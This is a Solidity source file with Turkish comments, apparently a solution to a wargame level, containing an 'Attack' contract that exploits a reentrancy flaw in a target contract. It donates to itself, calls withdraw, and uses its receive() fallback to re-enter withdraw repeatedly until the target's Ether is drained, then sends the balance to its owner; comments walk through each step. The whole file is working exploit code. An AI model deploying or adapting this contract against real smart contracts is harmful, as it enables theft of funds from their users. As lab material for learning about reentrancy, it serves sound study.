// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Reentrance sözleşmesindeki çağıracağımız metotları interface'e koyuyoruz.
//Böylece sözleşme içinde adresi belirtip çağırabiliyoruz: bkz. Attack sözleşmesi.
interface IReentrancy {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract Attack {
    address public target = 0x625EaAa1cBA846077aE7d312d35Ca5b85ccC0DB7; //Konsolunuzda Instance Address kısmında yazan adresi buraya yapıştırın
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance > 0) {
            IReentrancy(target).withdraw(0.001 ether);
        }
    }

    /*
    Sözleşmeyi yayımladıktan sonra ilk olarak bu metodu (addDonate()) çağırıyoruz.
    0.001 Ether gönderiyoruz çünkü sözleşme bakiyesi zaten 0.001 Ether ve 0.002 Ether olacak.
    Fallback metodumuz böylece sadece bir defa çağrılacak. 
    Neden bir defa? attack() metodundaki yoruma bakınız. 
    */
    function addDonate() public {
        IReentrancy(target).donate{value: 0.001 ether}(address(this));
    }

    /* 
    Attack() metodunu çağırıyoruz. 0.001 Ether çekiliyor ve Fallback (receive()) metodundaki 
    kod çalışıyor. Bakiyemiz güncellenmediği için if koşulu sağlanacak ve Fallback metodundaki withdraw
    metodu bir daha çağrılacak ve bir daha 0.001 Ether çekilecek. Bir döngü oluşuyor. Bu döngü hedef
    sözleşmedeki Etherler tükenene kadar devam eder.
    */

    function attack() public {
        IReentrancy(target).withdraw(0.001 ether);
    }

    //Sözleşmeye Ether ekliyoruz.
    function addFunds() public payable {}

    //Sözleşmemizden kendi adresimize Ether çekiyoruz.
    function withdrawFunds() public payable {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    //Sözleşme bakiyesini görüntülemek için.
    function seeContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
